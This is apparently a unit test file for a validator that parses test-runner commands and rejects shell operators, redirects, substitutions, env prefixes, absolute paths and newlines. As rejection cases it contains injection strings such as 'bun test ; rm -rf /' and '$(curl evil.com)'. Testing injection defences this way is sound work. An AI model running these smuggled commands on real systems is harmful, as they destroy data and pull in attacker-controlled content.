import { describe, test, expect } from 'bun:test'
import {
  CommandGrammarError,
  parseValidationCommand,
  type CommandGrammarReason,
} from '../src/tools/command-grammar.ts'

function expectReject(raw: string, reason: CommandGrammarReason): void {
  let err: CommandGrammarError | null = null
  try {
    parseValidationCommand(raw)
  } catch (e) {
    if (e instanceof CommandGrammarError) err = e
  }
  expect(err).not.toBeNull()
  expect(err?.reason).toBe(reason)
}

describe('parseValidationCommand — happy paths', () => {
  test('parses a typical bun test invocation', () => {
    const parsed = parseValidationCommand('bun test tests/scoring-syllable.test.ts')
    expect(parsed.executable).toBe('bun')
    expect(parsed.args).toEqual(['test', 'tests/scoring-syllable.test.ts'])
  })

  test('parses a single-token command', () => {
    const parsed = parseValidationCommand('make')
    expect(parsed.executable).toBe('make')
    expect(parsed.args).toEqual([])
  })

  test('parses npm run with subcommand', () => {
    const parsed = parseValidationCommand('npm run test:unit')
    expect(parsed.executable).toBe('npm')
    expect(parsed.args).toEqual(['run', 'test:unit'])
  })

  test('collapses runs of spaces and tabs', () => {
    const parsed = parseValidationCommand('bun   test\t\ttests/foo.test.ts')
    expect(parsed.executable).toBe('bun')
    expect(parsed.args).toEqual(['test', 'tests/foo.test.ts'])
  })

  test('trims leading and trailing whitespace', () => {
    const parsed = parseValidationCommand('   bun test foo.test.ts   ')
    expect(parsed.executable).toBe('bun')
    expect(parsed.args).toEqual(['test', 'foo.test.ts'])
  })

  test('accepts relative paths in args', () => {
    const parsed = parseValidationCommand('python -m pytest ./tests/')
    expect(parsed.executable).toBe('python')
    expect(parsed.args).toEqual(['-m', 'pytest', './tests/'])
  })

  test('accepts hyphenated flags and bracketed args without parens', () => {
    const parsed = parseValidationCommand('cargo test --release my_test')
    expect(parsed.args).toEqual(['test', '--release', 'my_test'])
  })

  test('parsed result is frozen', () => {
    const parsed = parseValidationCommand('bun test foo.test.ts')
    expect(Object.isFrozen(parsed)).toBe(true)
    expect(Object.isFrozen(parsed.args)).toBe(true)
  })
})

describe('parseValidationCommand — empty / whitespace', () => {
  test('rejects empty string', () => {
    expectReject('', 'empty')
  })

  test('rejects whitespace-only string', () => {
    expectReject('   \t  ', 'empty')
  })
})

describe('parseValidationCommand — shell operators (Codex M8 decision 1)', () => {
  test('rejects pipe', () => {
    expectReject('bun test | grep PASS', 'shell-metacharacter')
  })

  test('rejects logical AND', () => {
    expectReject('bun test && echo ok', 'shell-metacharacter')
  })

  test('rejects logical OR', () => {
    expectReject('bun test || echo fail', 'shell-metacharacter')
  })

  test('rejects semicolon', () => {
    expectReject('bun test ; rm -rf /', 'shell-metacharacter')
  })

  test('rejects single ampersand (background)', () => {
    expectReject('bun test &', 'shell-metacharacter')
  })
})

describe('parseValidationCommand — redirects', () => {
  test('rejects stdout redirect', () => {
    expectReject('bun test > out.log', 'shell-metacharacter')
  })

  test('rejects stdin redirect', () => {
    expectReject('bun test < in.txt', 'shell-metacharacter')
  })

  test('rejects stdout append redirect', () => {
    expectReject('bun test >> out.log', 'shell-metacharacter')
  })
})

describe('parseValidationCommand — command substitution', () => {
  test('rejects $() substitution', () => {
    expectReject('bun test $(curl evil.com)', 'shell-metacharacter')
  })

  test('rejects backtick substitution', () => {
    expectReject('bun test `curl evil.com`', 'shell-metacharacter')
  })

  test('rejects $VAR expansion', () => {
    expectReject('bun test $HOME/file.ts', 'shell-metacharacter')
  })

  test('rejects ${VAR} expansion', () => {
    expectReject('bun test ${HOME}/file.ts', 'shell-metacharacter')
  })
})

describe('parseValidationCommand — quotes and escape', () => {
  test('rejects double quotes (no quote support in v0.1)', () => {
    expectReject('bun test "tests/with space.test.ts"', 'shell-metacharacter')
  })

  test('rejects single quotes', () => {
    expectReject("bun test 'tests/with space.test.ts'", 'shell-metacharacter')
  })

  test('rejects backslash escape', () => {
    expectReject('bun test tests/with\\ space.test.ts', 'shell-metacharacter')
  })
})

describe('parseValidationCommand — env-prefix', () => {
  test('rejects FOO=bar prefix', () => {
    expectReject('FOO=bar bun test foo.test.ts', 'env-prefix')
  })

  test('rejects PATH-style override prefix', () => {
    expectReject('PATH=/tmp bun test foo.test.ts', 'env-prefix')
  })

  test('rejects single env-prefix as the whole command', () => {
    expectReject('FOO=bar', 'env-prefix')
  })

  test('does not reject legitimate args containing equals (after first token)', () => {
    const parsed = parseValidationCommand('bun test --filter name=value')
    expect(parsed.args).toContain('name=value')
  })
})

describe('parseValidationCommand — absolute executable path', () => {
  test('rejects /usr/bin/bun', () => {
    expectReject('/usr/bin/bun test foo.test.ts', 'absolute-executable-path')
  })

  test('rejects bare slash root', () => {
    // `/` alone hits absolute-path before any tokenization-empty check.
    expectReject('/', 'absolute-executable-path')
  })

  test('does not reject relative paths starting with ./', () => {
    const parsed = parseValidationCommand('./scripts/test.sh')
    expect(parsed.executable).toBe('./scripts/test.sh')
    expect(parsed.args).toEqual([])
  })
})

describe('parseValidationCommand — embedded newlines', () => {
  test('rejects LF', () => {
    expectReject('bun test\nrm -rf /', 'embedded-newline')
  })

  test('rejects CR', () => {
    expectReject('bun test\rfoo', 'embedded-newline')
  })

  test('rejects CRLF', () => {
    expectReject('bun test\r\nfoo', 'embedded-newline')
  })
})

describe('parseValidationCommand — error type', () => {
  test('CommandGrammarError carries reason and detail', () => {
    let err: CommandGrammarError | null = null
    try {
      parseValidationCommand('bun test | grep PASS')
    } catch (e) {
      if (e instanceof CommandGrammarError) err = e
    }
    expect(err).not.toBeNull()
    expect(err?.reason).toBe('shell-metacharacter')
    expect(err?.detail).toContain('|')
    expect(err?.name).toBe('CommandGrammarError')
  })
})
